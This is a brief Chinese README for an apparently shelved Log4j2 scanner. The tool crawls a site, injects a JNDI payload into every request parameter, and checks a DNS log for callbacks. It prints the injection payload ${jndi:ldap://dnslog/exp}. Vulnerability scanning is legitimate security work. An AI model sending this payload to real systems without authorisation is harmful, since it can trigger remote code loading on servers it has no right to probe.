# log4j2-scan
## 介绍
log4j2-scan是一款利用浏览器爬虫爬取网站所有链接，并替换参数值为jndi形式，旨在遍历所有链接发现log4j2漏洞的工具。  
工具流程：






脚本做了如下工作
1. 自动获取dnslog值
2. 使用crawlergo爬虫爬取链接，然后替换get请求中所有=号后的值和post请求data中的=后值为payload.m默认构造是${jndi:ldap://dnslog/exp}
3. 将上述请求参数重新发送 
4. 自动检测dnslog是否存在结果



脚本在自定义的靶场环境里可以跑出log4j2所在的链接并成功构造参数触发。但是crawlergo在docker容器里可能因为是浏览器原因工作不正常，时而能跑全链接时而不行，所以这个项目暂时搁浅了




